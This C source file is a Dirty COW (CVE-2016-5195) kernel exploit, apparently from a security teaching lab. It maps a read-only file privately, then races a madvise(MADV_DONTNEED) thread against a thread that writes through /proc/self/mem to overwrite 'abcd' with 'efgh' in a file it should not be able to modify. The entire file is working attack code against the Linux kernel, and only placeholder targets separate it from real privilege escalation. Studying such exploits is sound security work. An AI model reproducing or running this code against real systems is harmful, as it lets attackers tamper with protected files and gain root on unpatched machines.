#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
#include <sys/io.h>

// gcc -o dirtyCOW dirtyCOW.c -g -m32 -lpthread

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
	pthread_t pth1,pth2;
	struct stat st;
	int file_size;

	int pid_t = getpid();
	printf("pid in main() is: %d\n", pid_t);

	// Open the target file in the read-only mode.
	int f=open("/xxx", O_RDONLY);

	// Map the file to COW memory using MAP_PRIVATE.
	fstat(f, &st); // get file status
	file_size = st.st_size; // total size in bytes
	map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0); // PROT_READ for read-only mapping
								 // MAP_PRIVATE triggers COW on write()

	// Find the position of the target area
	char *position = strstr(map, "abcd"); // strstr is to locate a substring                     

	// We have to do the attack using two threads.
	pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
	pthread_create(&pth2, NULL, writeThread, position);             

	// Wait for the threads to finish.
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	return 0;
}

void *writeThread(void *arg)
{
	char *content= "efgh";
	off_t offset = (off_t) arg;

	int pid_t = getpid();
	printf("pid in writeThread() is: %d\n", pid_t);

	int f=open("/proc/self/mem", O_RDWR); //Using the /proc file system, a process can use read(), write(), lseek() etc to access data from its memory.
	while(1) {
		// Move the file pointer to the corresponding position.
		lseek(f, offset, SEEK_SET); // reposition read/write file offset
		// Write to the memory.
		write(f, content, strlen(content));
	}
}

void *madviseThread(void *arg)
{
	int file_size = (int) arg;

	int pid_t = getpid();
	printf("pid in madviseThread() is: %d\n", pid_t);

	while(1){
		madvise(map, file_size, MADV_DONTNEED); // madvise() is used to give advice to the kernel about the use of memory from the address range beginning at address addr and with size length bytes 

	}
}